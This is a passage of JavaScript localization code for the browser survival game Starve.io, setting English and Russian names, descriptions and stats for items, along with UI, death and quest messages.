        ve[le.FUR] = ["Rabbit Fur", "That rabbit was so cute..."];
        ve[le.SPECIAL_FUR] = ["Pure Fur", "You're a bread factory"];
        ve[le.SPECIAL_FUR_2] = ["Dark Fur", "You get ready to do something wrong"];
        ve[le.FUR_WINTER] = ["Winter Fur", "These animals just wanted a hug..."];
        ve[le.SCALES] = ["Scales", "It smells like fish!"];
        ve[le.KRAKEN_SKIN] = ["Kraken Skin", "Weren't you too scared?"];
        ve[le.FIRE] = ["Firecamp", "Warm you up!", "Durability: 150", "Lifetime: 2min"];
        ve[le.BIG_FIRE] = ["Big Firecamp", "Warm you up more time!", "Durability: 400", "Lifetime: 6min"];
        ve[le.WORKBENCH] = ["Workbench", "Very useful to craft all kinds of objects"];
        ve[le.CORD] = ["Cord", "Used in crafting Hats and Bag"];
        ve[le.BLUE_CORD] = ["Diamond Cord", "Used in crafting Special Hats"];
        ve[le.CHEST] = ["Chest", "Allows you to store items", "Durability: 500"];
        ve[le.SWORD_WOOD] = ["Wood Sword", "Does that work?", "Damage: 12", "Building Damage: 4"];
        ve[le.SWORD] = ["Stone Sword", "Be nice to others", "Damage: 19", "Building Damage: 6"];
        ve[le.SWORD_GOLD] = ["Gold Sword", "King of the forest", "Damage: 22", "Building Damage: 7"];
        ve[le.SWORD_DIAMOND] = ["Diamond Sword", "You can feel the power", "Damage: 24", "Building Damage: 8"];
        ve[le.PIRATE_SWORD] = ["Pirate Sword", "Ayyyyy!", "Better range than a normal sword", "Damage: 24", "Building Damage: 8"];
        ve[le.SWORD_AMETHYST] = ["Amethyst Sword", "Mauve is the most beautiful color of the world", "Damage: 27", "Building Damage: 9"];
        ve[le.DRAGON_SWORD] = ["Dragon Sword", "No mercy!", "Damage: 30", "Building Damage: 10"];
        ve[le.DRAGON_SPEAR] = ["Dragon Spear", "Kill them all!", "Damage: 22", "Building Damage: 7"];
        ve[le.PICK_WOOD] = ["Wood Pickaxe", "Can harvest only stone and wood", "Damage: 1"];
        ve[le.PICK] = ["Stone Pickaxe", "Can harvest wood, stone and gold", "Damage: 2"];
        ve[le.PICK_GOLD] = ["Gold Pickaxe", "Can also harvest diamond", "Damage: 3", "Building Damage: 1"];
        ve[le.PICK_DIAMOND] = ["Diamond Pickaxe", "Can also harvest amethyst", "Damage: 4", "Building Damage: 1"];
        ve[le.PICK_AMETHYST] = ["Amethyst Pickaxe", "Can also harvest reidite, looks fancy!", "Damage: 5", "Building Damage: 1"];
        ve[le.HAMMER] = ["Stone Hammer", "Useful to destroy buildings", "Doesn't work well on diamond or amethyst", "Damage: 2", "Building Damage: 20"];
        ve[le.HAMMER_GOLD] = ["Gold Hammer", "Useful to destroy buildings", "Doesn't work well on amethyst", "Damage: 3", "Building Damage: 30"];
        ve[le.HAMMER_DIAMOND] = ["Diamond Hammer", "Useful to destroy buildings", "Damage: 4", "Building Damage: 40"];
        ve[le.HAMMER_AMETHYST] = ["Amethyst Hammer", "Useful to destroy buildings", "Damage: 5", "Building Damage: 50"];
        ve[le.SUPER_HAMMER] = ["Super Hammer", "Have you planned to destroy the world?", "Damage: 12", "Building Damage: 70"];
        ve[le.WOOD_SPEAR] = ["Wood Spear", "Like a wooden stick, but it stings.", "Damage: 10", "Building Damage: 3"];
        ve[le.SPEAR] = ["Stone Spear", "The beginning of evolution!", "Damage: 14", "Building Damage: 4"];
        ve[le.GOLD_SPEAR] = ["Gold Spear", "Careful, it stings!", "Damage: 15", "Buildings Damage: 5"];
        ve[le.DIAMOND_SPEAR] = ["Diamond Spear", "You're ready to kill a dragon", "Damage: 17", "Buildings Damage: 5"];
        ve[le.AMETHYST_SPEAR] = ["Amethyst Spear", "Dragons no longer frighten you", "Damage: 18", "Buildings Damage: 6"];
        ve[le.SHOVEL] = ["Stone Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 2"];
        ve[le.SHOVEL_GOLD] = ["Gold Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 3", "Buildings Damage: 1"];
        ve[le.SHOVEL_DIAMOND] = ["Diamond Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 4", "Buildings Damage: 1"];
        ve[le.SHOVEL_AMETHYST] = ["Amethyst Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 5", "Buildings Damage: 1"];
        ve[le.WOOD_HELMET] = ["Wood Helmet", "Better than nothing", "Players Defense: 1", "Animals Defense: 4"];
        ve[le.STONE_HELMET] = ["Stone Helmet", "You're ready for battle!", "Players Defense: 2", "Animals Defense: 8"];
        ve[le.GOLD_HELMET] = ["Gold Helmet", "AKA the helmet of the savages", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.DIAMOND_HELMET] = ["Diamond Helmet", "Don't brag too much", "Players Defense: 5", "Animals Defense: 19"];
        ve[le.AMETHYST_HELMET] = ["Amethyst Helmet", "You're no longer afraid of anything", "Players Defense: 6", "Animals Defense: 23"];
        ve[le.REIDITE_HELMET] = ["Reidite Helmet", "You no longer feel pain", "Players Defense: 7", "Animals Defense: 25"];
        ve[le.DRAGON_HELMET] = ["Dragon Helmet", "You will conquer the world", "Players Defense: 8", "Animals Defense: 27"];
        ve[le.EXPLORER_HAT] = ["Explorer hat", "Animals won't pay attention to you", "but don't make noises!", "Warm outside water and in winter", "You also calm down aggressive monsters twice as fast"];
        ve[le.CHRISTMAS_HAT] = ["Christmas Hat", "Oh, oh, oh, Merry Christmas", "Warm outside water and in winter"];
        ve[le.ELF_HAT] = ["Elf Hat", "Don't let yourself be exploited, you little snow elf!", "Warm outside water and in winter"];
        ve[le.HOOD] = ["Hood", "You're a rogue", "You can steal someone only if", "1) It's night", "2) You're not wearing anything", "3) If you haven't been touched for eight seconds", "4) You are not close a fire", "5) Your target doesn't wear a peasant outfit", "Warm outside water and in winter"];
        ve[le.EARMUFFS] = ["Earmuffs", "Some kind of little chapka.", "Warm outside water and in winter"];
        ve[le.COAT] = ["Chapka", "Also called a coat.", "Warmer outside water and in winter"];
        ve[le.CAP_SCARF] = ["Winter Scarf and Cap", "Very comfortable", "Very Warm"];
        ve[le.FUR_HAT] = ["Mammoth fur hat", "The best blizzard protection", "Very Warm"];
        ve[le.PEASANT] = ["Peasant", "Your plants grow faster", "Warm outside water and in winter"];
        ve[le.WINTER_HOOD] = ["Winter Hood", "You can steal someone only if", "- It's night", "- You're not wearing anything", "- If you haven't been touched for four seconds", "- You are not close a fire", "- Your target doesn't wear a winter peasant outfit", "Warm outside water and in winter"];
        ve[le.WINTER_PEASANT] = ["Winter Peasant", "Your plants grow faster", "Warm outside water and in winter"];
        ve[le.DIVING_MASK] = ["Diving Mask", "You are fast in the water", "Warm in water", "Players Defense: 2, Animals Defense: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["Super Diving Mask", "You are very fast in the water", "Warm in water", "Players Defense: 4, Animals Defense: 16"];
        ve[le.DRAGON_ORB] = ["Dragon Orb", "You feel a great power emanating from this orb"];
        ve[le.DRAGON_HEART] = ["Dragon Heart", "Turns you into a Ghost on Death!", "You are a ghost for 60 seconds", "Find a resurrection stone"];
        ve[le.GEMME_GREEN] = ["Green Gemstone", "You didn't cheat, promise?"];
        ve[le.GEMME_ORANGE] = ["Orange Gemstone", "Only a real pirate can find it!"];
        ve[le.GEMME_BLUE] = ["Blue Gemstone", "For too kind people"];
        ve[le.CROWN_GREEN] = ["Green Crown", "You heal yourself very quickly", "Heal over time: 40", "Players Defense: 4, Animals Defense: 16"];
        ve[le.CROWN_ORANGE] = ["Orange Crown", "You suddenly feel very lucky", "Players Defense: 4, Animals Defense: 16"];
        ve[le.CROWN_BLUE] = ["Blue Crown", "Once you're dead, you'll become a ghost", "Though you will lose your weapon", "Players Defense: 4, Animals Defense: 16"];
        ve[le.BUCKET_FULL] = ["Bucket", "Useful to fill a well", "One bucket is equivalent to twelve bottles"];
        ve[le.BUCKET_EMPTY] = ["Empty Bucket", "You need to fill this bucket near a water source"];
        ve[le.BOTTLE_FULL] = ["Bottle", "Allows you to drink water anywhere", "Water: 50"];
        ve[le.BOTTLE_EMPTY] = ["Empty Bottle", "You can fill this bottle near a water source"];
        ve[le.WATERING_CAN] = ["Empty Watering Can", "You must fill it with a water source to use it"];
        ve[le.WATERING_CAN_FULL] = ["Watering Can", "Allows watering of plants", "Damage: 1"];
        ve[le.BAG] = ["Bag", "More space for your items!"];
        ve[le.PAPER] = ["Paper", "Used in book-crafting"];
        ve[le.BOOK] = ["Book", "Allows to considerably reduce the time of crafting", "Must be wearing to work", "Damage: 1"];
        ve[le.BANDAGE] = ["Bandage", "Recover more quickly your life", "Heal over time: 30", "Effect: 5"];
        ve[le.LOCK] = ["Lock", "Allow you to lock your chest"];
        ve[le.LOCKPICK] = ["Lock-pick", "Allows you to unlock one chest"];
        ve[le.TOTEM] = ["Totem", "Allow you to create a team", "Share doors and chests", "Harmful building won't hurt your friend"];
        ve[le.BRIDGE] = ["Bridge", "Very useful on water", "It allows you to drink without drowning", "Walk faster in water"];
        ve[le.SIGN] = ["Sign", "Leave a message to others", "Durability: 200"];
        ve[le.ROOF] = ["Roof", "Hides you a little and warms you!", "Also protects you against sand storm"];
        ve[le.WELL] = ["Well", "Allows bottle filling", "Durability: 1000"];
        ve[le.WALL] = ["Wood Wall", "It's just a wall", "Durability: 1000"];
        ve[le.STONE_WALL] = ["Stone Wall", "It's a little more serious.", "Durability: 1500"];
        ve[le.GOLD_WALL] = ["Gold Wall", "Gold on your walls? It's kind of flashy.", "Durability: 2000"];
        ve[le.DIAMOND_WALL] = ["Diamond Wall", "So shiny, watch your eyes", "Durability: 2500"];
        ve[le.AMETHYST_WALL] = ["Amethyst Wall", "You must be very scared to go out!", "Durability: 3500"];
        ve[le.SPIKE] = ["Wood Spike", "Can damage your enemies", "Damage: 10, On-Hit Damage: 2", "Durability: 150"];
        ve[le.STONE_SPIKE] = ["Stone Spike", "I wouldn't want to be your enemy.", "Damage: 20", "On-Hit Damage: 3", "Durability: 300"];
        ve[le.GOLD_SPIKE] = ["Gold Spike", "You're so cruel.", "Damage: 30", "On-Hit Damage: 3", "Durability: 600"];
        ve[le.DIAMOND_SPIKE] = ["Diamond Spike", "You don't like to have company.", "Damage: 40", "On-Hit Damage: 4", "Durability: 1200"];
        ve[le.AMETHYST_SPIKE] = ["Amethyst Spike", "What the hell did your neighbors do to you?", "Damage: 50", "On-Hit Damage: 4", "Durability: 2400"];
        ve[le.WOOD_DOOR] = ["Wood Door", "Can be opened or closed by you or your friends", "Durability: 1000"];
        ve[le.STONE_DOOR] = ["Stone Door", "A stronger door is more serious", "Durability: 1500"];
        ve[le.GOLD_DOOR] = ["Gold Door", "Are you rebuilding the \"el dorado?\"", "Durability: 2000"];
        ve[le.DIAMOND_DOOR] = ["Diamond Door", "For a shining house", "Durability: 2500"];
        ve[le.AMETHYST_DOOR] = ["Amethyst Door", "Is your house a locked safe?", "Durability: 3500"];
        ve[le.FURNACE] = ["Furnace", "Warms you up", "It consumes wood all 5 seconds", "Durability: 1000"];
        ve[le.WINDMILL] = ["Windmill", "Can produce flour from wheat", "It takes 5 seconds to make Flour", "Returns points when working", "Durability: 2000"];
        ve[le.BREAD_OVEN] = ["Bread Oven", "Allows bread to be made from flour", "It takes 10 seconds to make bread", "Returns points when working", "Durability: 2000"];
        ve[le.RESURRECTION] = ["Resurrection stone", "It's magic", "Resurrect you if you're a ghost", "You will lose your weapon", "Durability: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "You cannot join this server";
        ve[TEXT.KICKED] = "Kicked: ";
        ve[TEXT.KEY_ALREADY] = "Your key is already used by someone else";
        ve[TEXT.KEY_WRONG] = "Your key is wrong";
        ve[TEXT.OLD_VERSION] = "You have an old version, you need to clear your cache";
        ve[TEXT.NEW_VERSION] = "Your client version is too recent for this server. The server is being updated";
        ve[TEXT.WRONG_PASSWORD] = "Wrong password! To enter a password: https://starve.io/?password=...";
        ve[TEXT.NO_MORE_RESOURCES] = "There are no more new resources";
        ve[TEXT.SURVIVED_1DAY] = "You survived 1 day";
        ve[TEXT.SURVIVED] = "You survived ";
        ve[TEXT.DAYS] = " days";
        ve[TEXT.DEAD_SAD] = "You are dead ;-;";
        ve[TEXT.SPAM_ME] = "Server cannot find spawn location! Spam the play button!";
        ve[TEXT.SPAM_ME2] = "Server is full! Spam the play button!";
        ve[TEXT.EMPTY] = "Resource is empty";
        ve[TEXT.INV_FULL] = "Inventory is full (right-click to empty items)";
        ve[TEXT.DEAD] = " is dead";
        ve[TEXT.WRONG_TOOL] = "This is not the right tool";
        ve[TEXT.JOIN_TEAM] = "You joined a team";
        ve[TEXT.YOU_DEAD] = "You are dead";
        ve[TEXT.JOINED_TEAM] = " joined the team";
        ve[TEXT.TEAM_DESTROYED] = "Your team was destroyed";
        ve[TEXT.LEFT_TEAM] = "You left the team";
        ve[TEXT.LEFT_TEAM2] = " left the team";
        ve[TEXT.TOKEN] = "Someone stole your token :>";
        ve[TEXT.CHOOSE] = "Choose a server";
        ve[TEXT.PLAYERS] = "players";
        ve[TEXT.TOTAL_PLAYERS] = "total players";
        ve[TEXT.TOTAL_MODE] = "players on this mode";
        ve[TEXT.COMMING_SOON] = "Coming soon...";
        document.getElementById("nickname_input").placeholder = "Nickname";
        Le[0] = ["You were killed for no reason"];
        Le[1] = ["You starved to death, as the name of the game implies"];
        Le[2] = ["You froze to death. So sad", "You got hypothermia. Next time, try sitting by a fire instead."];
        Le[3] = ["A player killed you whilst telling you to 'git gud.'", "You got murdered by a player. Don't worry, that player will die too, eventually."];
        Le[4] = ["You stayed too close to the fire and burnt to death. Bad idea.", "You died to a fire. Fires hurt you. Go write a story about it."];
        Le[5] = ["Your body will become a nest for spider eggs", "A spider killed you. At least it wasn't a rabbit."];
        Le[6] = ["The wolf won't starve anymore after eating you", "They aren't dogs. Wolves don't like being pet."];
        Le[7] = ["The fox was too quick for you", "The fox turned you into a box. Since when do animals have magic powers?"];
        Le[8] = ["The bear only wanted a hug.", "The bear was too much to bare. I'm not sorry."];
        Le[9] = ["You were burnt to a crisp by a dragon. So sad.", "You got flattened by a dragon. Getting squished is a horrible way to die."];
        Le[10] = ["You jumped into a spike wall. Not a good idea...", "You got killed by a spike wall. Most people are sensible enough not to touch pointy things."];
        Le[11] = ["Even the ghost can die.", "You failed to be resurrected. This is a game, so you go to life after you die, so..."];
        Le[12] = ["A bacterium from your raw food killed you. This game is definitely too hard.", "You killed the raw food. It killed you too."];
        Le[13] = ["You died of thirst. Better drink your own piss."];
        Le[14] = ["Did you know starver's mouths are always below water when swimming? Now you know."];
        Le[15] = ["Do not worry, the piranha finds you tasty.", "Fun fact: Pirahnas eat people. Including you."];
        Le[16] = ["LapaMauve does not plan that you can kill the kraken", "A kraken krak-ed your skull."];
        Le[17] = ["Your skin's falling apart, the sun killed you."];
        Le[18] = ["Garlic stored in your pockets boiled your brain."];
        Le[19] = ["As a vampire, don't stand near the garlic cloves."];
        Le[20] = ["You ate garlic as a vampire, what did you expect?"];
        Le[21] = ["Your body wraps itself in thornbushes. As you try to escape, your skin comes off and your heart stops beating."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg... I'm starving", "Need your brain Uuunnnggg...", "Fresh meat here... Uuunnnggg", "Uuunnnggg... You are tasty", "Uuunnnggg...", "Eat... uuunnnggg...", "I can smell blood... Uuunnnggg"];
      }, Ne = function () {
        ve[le.DRAGON_CUBE] = ["You feel a great power emanating from this orb"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME";
        ve[TEXT.TWITTER] = " Share on Twitter";
        ve[TEXT.FACEBOOK] = " Share on Facebook";
        ve[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Kill";
        ve[TEXT.DAYS_SURVIVED] = "Days survived";
        ve[TEXT.MODE_FREE] = "Building method: Free. Press G to change";
        ve[TEXT.MODE_GRID] = "Building method: Grid. Press G to change";
        ve[le.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quests";
        document.getElementById("timeremainingquest").innerHTML = "Time Remaining";
        document.getElementById("constraintquest").innerHTML = " Constraints";
        document.getElementById("claim_rewards").innerHTML = " Claim rewards";
        document.getElementById("rewardquest").innerHTML = " Reward";
        document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart";
        document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst";
        document.getElementById("survive20min_3").innerHTML = "Survive without losing life";
        document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests";
        document.getElementById("dont_hit_5").innerHTML = " Be peaceful";
        document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter";
        document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUIT";
        ve[le.HAND] = ["Рука"];
        ve[le.GROUND] = ["Земля", "Грязно!"];
        ve[le.SAND] = ["Песок", "Он в моих глазах!"];
        ve[le.WOOD] = ["Дерево", "Постоянно нужно больше!"];
        ve[le.STONE] = ["Камень", "Твердый"];
        ve[le.GOLD] = ["Золото", "Будьте щедры, давайте его другим"];
        ve[le.DIAMOND] = ["Алмаз", "Что вы создадите с помощью него?"];
        ve[le.AMETHYST] = ["Аметист", "Он сиреневый, как Lapa"];
        ve[le.FLOUR] = ["Мука", "Используется в готовке"];
        ve[le.COOKIE] = ["Печенье", "Превосходное бабушкино печенье", "Еда: 50"];
        ve[le.CAKE] = ["Торт", "Торт мечты для гурманов", "Еда: 100"];
        ve[le.MEAT] = ["Сырое Мясо", "Ты можешь пожарить его с помощью огня", "Вызывает отравление: 10", "Еда: 15"];
        ve[le.COOKED_MEAT] = ["Жареное Мясо", "Превосходный стейк, пожалуйста", "Еда: 35"];
        ve[le.FOODFISH] = ["Сырая Рыба", "Я думаю она всё ещё жива", "Вызывает отравление: 10", "Еда: 18"];
        ve[le.FOODFISH_COOKED] = ["Жареная рыба", "С лимоном она прекрасна", "Еда: 35"];
        ve[le.BREAD] = ["Хлеб", "Прекрасный французский хлеб", "Это валюта, используемая на рынке", "Еда: 15"];
        ve[le.SANDWICH] = ["Бутерброд", "На вкус как Крабсбургер", "Еда: 100"];
        ve[le.CANDY] = ["Конфеты", "Только для детей!", "Еда: 20"];
        ve[le.SUGAR_CAN] = ["Сахарная Трость", "Попробуйте это, это вкусно", "Еда: 100"];
        ve[le.GARLAND] = ["Гирлянда", "Прекрасная декорация для крыши"];
        ve[le.SEED] = ["Семя Ягоды", "Вырастает в ягоды", "Рождение: 2мин", "Рост: 55сек", "Нужна вода: 3мин 20сек", "Прочность: 700", "Продолжительность: 8 дней"];
        ve[le.PLANT] = ["Ягода", "Ягода вкусная!", "Еда: 10"];
        ve[le.WHEAT_SEED] = ["Пшеничное Семя", "Вырастает в пшеницу", "Рождение: 2мин", "Рост: 16сек", "Нужна вода: 2мин", "Прочность: 700", "Продолжительность: 8 дней"];
        ve[le.WILD_WHEAT] = ["Дикая Пшеница", "Перемалывается в муку, когда помещается в мельницу"];
        ve[le.PUMPKIN_SEED] = ["Семена Тыквы", "Вырастает в тыкву", "Рождение: 2мин 40сек", "Рост: 2мин", "Нужна вода: 2мин", "Прочность: 700", "Продолжительность: 8 дней"];
        ve[le.PUMPKIN] = ["Тыква", "Это напоминает мне Хеллоуин", "Еда: 30"];
        ve[le.GARLIC_SEED] = ["Семена Чеснока", "Очень опасно для вампиров", "Урон: 20", "Рождение: 4мин", "Рост: 4 мин", "Нужна вода: 1мин 40сек", "Прочность: 700", "Продолжительность: 8 дней"];
        ve[le.GARLIC] = ["Чеснок", "Лечит и снижает получаемый холод", "Еда: 14", "Лечит: 30", "Эффект: 1"];
        ve[le.THORNBUSH_SEED] = ["Семена Колючего Куста", "Может нанести урон врагам", "Урон: 20", "Рождение: 4мин", "Рост: 15сек", "Нужна вода: 3мин", "Прочность: 1000", "Продолжительность: 8 дней"];
        ve[le.THORNBUSH] = ["Колючий Куст", "Это больно!"];
        ve[le.PLOT] = ["Грядка", "Серьезно, используйте это.", "С этим ГМО удобрением ваши растения", "будут расти быстрее и потребуют меньше воды", "Прочность: 2000"];
        ve[le.ICE] = ["Лёд", "Используется для изготовления тортов и воды"];
        ve[le.SPANNER] = ["Гаечный Ключ", "Для починки дверей, стен, колючек", "Урон: 2"];
        ve[le.FUR_WOLF] = ["Шкура Волка", "Щенок? Но где же Щенок?!"];
        ve[le.FUR] = ["Шкура Зайца", "Этот кролик был таким милым..."];
        ve[le.SPECIAL_FUR] = ["Чистая Шкура", "Вы - фабрика хлеба"];
        ve[le.SPECIAL_FUR_2] = ["Чёрная Шкура", "Вы готовы делать зло."];
        ve[le.FUR_WINTER] = ["Зимняя Шкура", "Эти животные просто хотели обнять тебя..."];
        ve[le.SCALES] = ["Чешуя", "Она пахнет рыбой!"];
        ve[le.KRAKEN_SKIN] = ["Шкура Кракена", "Вы не испугались?"];
        ve[le.FIRE] = ["Костёр", "Согрейтесь!", "Прочность: 150", "Продолжительность: 2мин"];
        ve[le.BIG_FIRE] = ["Большой Костёр", "Согрейтесь больше!", "Прочность: 400", "Продолжительность: 6мин"];
        ve[le.WORKBENCH] = ["Верстак", "Необходим для создания многих предметов"];
        ve[le.CORD] = ["Нить", "Используется в изготовлении Шапок и Рюкзака"];
        ve[le.BLUE_CORD] = ["Алмазная Нить", "Используется в изготовлении специальных шапок"];
        ve[le.CHEST] = ["Сундук", "Позволяет хранить предметы", "Прочность: 500"];
        ve[le.SWORD_WOOD] = ["Деревянный Меч", "Это работает?", "Урон: 12", "Урон по строениям: 4"];
        ve[le.SWORD] = ["Каменный Меч", "Будьте добры к другим", "Урон: 19", "Урон по строениям: 6"];
        ve[le.SWORD_GOLD] = ["Золотой Меч", "Король леса", "Урон: 22", "Урон по строениям: 7"];
        ve[le.SWORD_DIAMOND] = ["Алмазный Меч", "Ты можешь почувствовать силу", "Урон: 24", "Урон по строениям: 8"];
        ve[le.PIRATE_SWORD] = ["Пиратский Меч", "Aррррр!", "Дальность атаки больше чем у нормального меча", "Урон: 24", "Урон по строениям: 8"];
        ve[le.SWORD_AMETHYST] = ["Аметистовый Меч", "Сиреневый - самый красивый цвет в мире", "Урон: 27", "Урон по строениям: 9"];
        ve[le.DRAGON_SWORD] = ["Меч Дракона", "Без пощады!", "Урон: 30", "Урон по строениям: 10"];
        ve[le.DRAGON_SPEAR] = ["Копьё Дракона", "Убивай всех!", "Урон: 22", "Урон по строениям: 6"];
        ve[le.PICK_WOOD] = ["Деревянная Кирка", "Может добывать только дерево и камень", "Урон: 1"];
        ve[le.PICK] = ["Каменная Кирка", "Может добывать дерево, камень и золото", "Урон: 2"];
        ve[le.PICK_GOLD] = ["Золотая Кирка", "Также может добывать алмазы", "Урон: 3", "Урон по строениям: 1"];
        ve[le.PICK_DIAMOND] = ["Алмазная Кирка", "Можно добывать всё", "Урон: 4", "Урон по строениям: 1"];
        ve[le.PICK_AMETHYST] = ["Аметистовая Кирка", "Можно добывать всё, ещё и выглядит красиво!", "Урон: 5", "Урон по строениям: 1"];
        ve[le.HAMMER] = ["Каменный молот", "Используется для разрушения зданий", "Плохо разрушает алмазные и аметистовые здания", "Урон: 2", "Урон по строениям: 20"];
        ve[le.HAMMER_GOLD] = ["Золотой Молот", "Используется для разрушения зданий", "Плохо разрушает аметистовые здания", "Урон: 3", "Урон по строениям: 30"];
        ve[le.HAMMER_DIAMOND] = ["Алмазный Молот", "Используется для разрушения зданий", "Урон: 4", "Урон по строениям: 40"];
        ve[le.HAMMER_AMETHYST] = ["Аметистовый Молот", "Используется для разрушения зданий", "Урон: 5", "Урон по строениям: 50"];
        ve[le.SUPER_HAMMER] = ["Супер Молот", "У вас есть планы разрушить мир?", "Урон: 12", "Урон по строениям: 70"];
        ve[le.WOOD_SPEAR] = ["Деревянное Копьё", "Выглядит как деревянная палочка, но делает больно.", "Урон: 10", "Урон по строениям: 2"];
        ve[le.SPEAR] = ["Каменное Копьё", "Начало эволюции!", "Урон: 14", "Урон по строениям: 4"];
        ve[le.GOLD_SPEAR] = ["Золотое Копьё", "Осторожно, это больно!", "Урон: 15", "Урон по строениям: 5"];
        ve[le.DIAMOND_SPEAR] = ["Алмазное Копьё", "Вы готовы убивать дракона.", "Урон: 17", "Урон по строениям: 5"];
        ve[le.AMETHYST_SPEAR] = ["Аметистовое Копьё", "Драконы больше не пугают вас", "Урон: 18", "Урон по строениям: 6"];
        ve[le.SHOVEL] = ["Каменная Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 2"];
        ve[le.SHOVEL_GOLD] = ["Золотая Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 3", "Урон по строениям: 1"];
        ve[le.SHOVEL_DIAMOND] = ["Алмазная Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 4", "Урон по строениям: 1"];
        ve[le.SHOVEL_AMETHYST] = ["Аметистовая Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 5", "Урон по стреониям: 1"];
        ve[le.WOOD_HELMET] = ["Деревянный Шлем", "Лучше чем ничего", "Защита от игроков: 1", "Защита от животных: 4"];
        ve[le.STONE_HELMET] = ["Каменный Шлем", "Вы готовы к битве!", "Защита от игроков: 2", "Защита от животных: 8"];
        ve[le.GOLD_HELMET] = ["Золотой Шлем", "Также известен как шлем жестоких людей", "Защита от игроков: 4", "Защита от животных: 13"];
        ve[le.DIAMOND_HELMET] = ["Алмазный Шлем", "Не слишком хвастайтесь", "Защита от игроков: 5", "Защита от животных: 19"];
        ve[le.AMETHYST_HELMET] = ["Аметистовый Шлем", "Ты больше ничего не боишься", "Защита от игроков: 6", "Защита от животных: 23"];
        ve[le.DRAGON_HELMET] = ["Шлем Дракона", "Ты покоришь мир", "Защита от игроков: 8", "Защита от животных: 27"];
        ve[le.EXPLORER_HAT] = ["Шапка Исследователя", "Животные не обращают на вас внимания", "но не шумите!", "Защищает от холода вне воды."];
        ve[le.CHRISTMAS_HAT] = ["Рождественская Шапка", "Ох-хо-хо, Счастливого Рождества", "Защищает от холода вне воды."];
        ve[le.ELF_HAT] = ["Шапка Эльфа", "Не позволяйте себе эксплуатироваться, ведь вы маленький снежный эльф!", "Защищает от холода вне воды."];
        ve[le.HOOD] = ["Капюшон", "Вы разбойник", "Вы можете украсть что-то, если", "1) Ночь", "2) Вы ничего не носите", "3)Если вас не тронули в течение восьми секунд", "4) Вы не рядом с огнём", "5) Вы не можете ничего украсть у крестьянской туники", "Защищает от холода вне воды."];
        ve[le.EARMUFFS] = ["Теплые Наушники", "Какая-то маленькая шапка.", "Защищает от холода вне воды."];
        ve[le.COAT] = ["Шапка", "Так же называется пальтом.", "Защищает от холода вне воды."];
        ve[le.CAP_SCARF] = ["Зимний Шарф и Шапка", "Очень комфортно", "Очень тепло"];
        ve[le.PEASANT] = ["Крестьянская Туника", "Ваши растения растут быстрее", "Защищает от холода вне воды."];
        ve[le.WINTER_HOOD] = ["Зимний Капюшон", "Вы можете украсть что-то, если", "- Ночь", "- Вы ничего не носите", "- Если вас не тронули в течение четырёх секунд", "- Вы не рядом с огнём", "- Вы не можете ничего украсть у крестьянской туники", "Защищает от холода вне воды."];
        ve[le.WINTER_PEASANT] = ["Зимняя Крестьянская Туника", "Ваши растения растут быстрее", "Защищает от холода вне воды."];
        ve[le.DIVING_MASK] = ["Акваланг", "Вы быстрее передвигаетесь по воде", "Тепло в воде", "Защита от игроков: 2, Защита от животных: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["Супер Акваланг", "Вы очень быстро передвигаетесь по воде", "Тепло в воде", "Защита от игроков: 4, Защита от животных: 16"];
        ve[le.DRAGON_ORB] = ["Шар Дракона", "Даётся за квест"];
        ve[le.DRAGON_HEART] = ["Сердце Дракона", "Превращает вас в призрака после смерти!", "Вы призрак на 60 секунд", "Найдите камень воскрешения"];
        ve[le.GEMME_GREEN] = ["Зелёный Драгоценный Камень", "Вы без читов, правильно?"];
        ve[le.GEMME_ORANGE] = ["Оранжевый Драгоценный Камень", "Только настоящий пират найдёт это!"];
        ve[le.GEMME_BLUE] = ["Синий Драгоценный Камень", "Для очень добрых людей"];
        ve[le.CROWN_GREEN] = ["Зеленая корона", "Вы лечите себя очень быстро", "Лечит: 40", "Защита от игроков: 4, Защита от животных: 16"];
        ve[le.CROWN_ORANGE] = ["Оранжевая Корона", "Вам очень повезло", "Защита от игроков: 4, Защита от животных: 16"];
        ve[le.CROWN_BLUE] = ["Синяя Корона", "Как только вы умрёте, вы станете призраком", "Но вы потеряете своё оружие", "Защита от игроков: 4, Защита от животных: 16"];
